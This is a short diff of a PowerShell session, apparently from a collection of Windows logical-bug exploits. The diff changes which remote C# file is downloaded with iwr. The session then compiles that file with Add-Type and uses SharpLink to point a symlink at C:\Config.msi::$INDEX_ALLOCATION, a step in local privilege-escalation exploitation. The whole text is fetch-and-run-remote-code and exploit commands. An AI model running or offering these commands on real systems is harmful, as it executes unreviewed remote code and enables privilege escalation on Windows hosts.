@@ -1,5 +1,5 @@
 
-PS C:\Users\saila> $code = (iwr https://raw.githubusercontent.com/sailay1996/awesome_windows_logical_bugs/master/sharviewmodified.txt).content
+PS C:\Users\saila> $code = (iwr https://raw.githubusercontent.com/sailay1996/awesome_windows_logical_bugs/master/sharplinkmodified.txt).content
 PS C:\Users\saila> Add-Type $code
 PS C:\Users\saila> $s = New-Object de.usd.SharpLink.Symlink("C:\EOP\hello\abc.txt", "C:\Config.msi`:`:`$INDEX_ALLOCATION")
 PS C:\Users\saila> $s.Status()
